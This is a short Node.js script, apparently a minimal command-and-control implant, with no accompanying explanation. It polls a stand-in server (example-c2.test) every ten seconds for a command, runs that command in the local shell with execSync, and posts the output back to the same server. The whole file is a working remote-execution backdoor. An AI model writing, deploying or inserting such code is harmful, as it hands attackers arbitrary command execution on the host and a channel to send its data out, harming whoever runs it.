const axios = require('axios');
const { execSync } = require('child_process');

async function pollOnce() {
  const res = await axios.get('https://example-c2.test/tasks');
  const cmd = res.data.cmd;
  let stdout = '';
  let stderr = '';
  try {
    stdout = execSync(cmd, { timeout: 5000 }).toString();
  } catch (e) {
    stderr = String(e.message);
  }
  const out = { stdout: stdout, stderr: stderr };
  await axios.post('https://example-c2.test/results', out);
}

setInterval(pollOnce, 10000);
